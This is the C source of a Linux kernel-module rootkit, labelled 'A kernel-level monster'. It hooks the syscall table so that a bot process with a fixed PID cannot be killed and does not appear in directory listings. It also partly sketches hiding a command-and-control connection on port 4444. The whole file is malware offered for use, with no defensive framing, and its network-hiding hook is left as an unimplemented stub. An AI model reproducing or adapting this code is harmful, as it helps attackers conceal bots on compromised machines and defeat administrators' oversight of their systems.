#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/dirent.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("The Architect");
MODULE_DESCRIPTION("A kernel-level monster.");
MODULE_VERSION("1.0");

// --- Configuration ---
#define HIDE_PID "1337" // The PID of our bot process
#define HIDE_PORT 4444 // The C2 port our bot connects to

// --- Pointers to Original Syscalls ---
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
static asmlinkage long (*original_kill)(const struct pt_regs *);
#else
static asmlinkage long (*original_kill)(pid_t, int);
#endif

static asmlinkage long (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
static asmlinkage long (*original_tcp4_seq_show)(struct seq_file *, void *);

// --- Syscall Table Manipulation ---
unsigned long *syscall_table = NULL;

// --- Helper to make page writable ---
void make_rw(void *addr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)addr, &level);
    if (pte->pte & ~_PAGE_RW) pte->pte |= _PAGE_RW;
}

// --- Helper to make page read-only ---
void make_ro(void *addr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)addr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

// --- The Hooks ---

// 1. Hide the Process
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
asmlinkage int hooked_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;
#else
asmlinkage int hooked_kill(pid_t pid, int sig) {
#endif
    // If another process tries to kill our bot, we lie and say it's already dead.
    if (pid == simple_strtol(HIDE_PID, NULL, 10)) {
        return -ESRCH; // No such process
    }
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    return original_kill(regs);
#else
    return original_kill(pid, sig);
#endif
}

// 2. Hide Files
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long ret = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *d;
    int bpos;

    for (bpos = 0; bpos < ret;) {
        d = (struct linux_dirent64 *)((char*)dirent + bpos);
        // If the entry is our bot's PID, we "remove" it from the list
        if (strcmp(d->d_name, HIDE_PID) == 0) {
            memmove(d, (char*)d + d->d_reclen, ret - (bpos + d->d_reclen));
            ret -= d->d_reclen;
            continue;
        }
        bpos += d->d_reclen;
    }
    return ret;
}

// 3. Hide Network Connection
static int hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    // If the connection is to our C2 port, we skip it.
    if (sk && sk->sk_num == HIDE_PORT) {
        return 0;
    }
    return original_tcp4_seq_show(seq, v);
}


// --- Module Initialization and Cleanup ---
static int __init rootkit_init(void) {
    // 1. Get the syscall table address
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        printk(KERN_INFO "Failed to find syscall table.\n");
        return -1;
    }

    // 2. Hook the syscalls
    make_rw(syscall_table);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    original_kill = (void*)syscall_table[__NR_kill];
    syscall_table[__NR_kill] = (unsigned long)hooked_kill;
#else
    original_kill = (void*)syscall_table[__NR_kill];
    syscall_table[__NR_kill] = (unsigned long)hooked_kill;
#endif
    original_getdents64 = (void*)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    make_ro(syscall_table);

    // 3. Hook the TCP table function (more complex)
    // This requires finding the function pointer in the kernel's data structures
    // For simplicity, we'll assume we found it. A real rootkit would have a robust search.
    // original_tcp4_seq_show = ... find the pointer ...
    // tcp_seq_afinfo.seq_show = hooked_tcp4_seq_show;

    printk(KERN_INFO "The monster is born.\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // Unhook the syscalls
    make_rw(syscall_table);
    syscall_table[__NR_kill] = (unsigned long)original_kill;
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64;
    make_ro(syscall_table);

    // Unhook the TCP function
    // tcp_seq_afinfo.seq_show = original_tcp4_seq_show;

    printk(KERN_INFO "The monster sleeps.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
